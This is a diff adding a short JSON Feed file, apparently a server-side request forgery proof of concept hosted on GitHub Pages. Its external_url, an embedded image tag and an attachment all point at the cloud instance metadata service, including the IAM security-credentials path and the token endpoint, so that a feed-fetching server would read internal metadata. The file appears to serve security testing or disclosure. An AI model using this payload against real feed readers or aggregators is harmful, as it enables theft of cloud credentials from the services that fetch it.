@@ -1,0 +1,18 @@
+{
+  "version": "https://jsonfeed.org/version/1.1",
+  "title": "POC JSON Feed",
+  "home_page_url": "http://example.com/",
+  "feed_url": "https://backy2222.github.io/poc-rss-host/poc_jsonfeed.json",
+  "items": [
+    {
+      "id": "1",
+      "title": "JSON Feed item 1",
+      "url": "http://example.com/1",
+      "external_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "content_html": "<img src='http://169.254.169.254/latest/meta-data/' alt='imds'>",
+      "attachments": [
+        {"url": "http://169.254.169.254/latest/api/token", "mime_type": "application/json", "size_in_bytes": 0}
+      ]
+    }
+  ]
+}
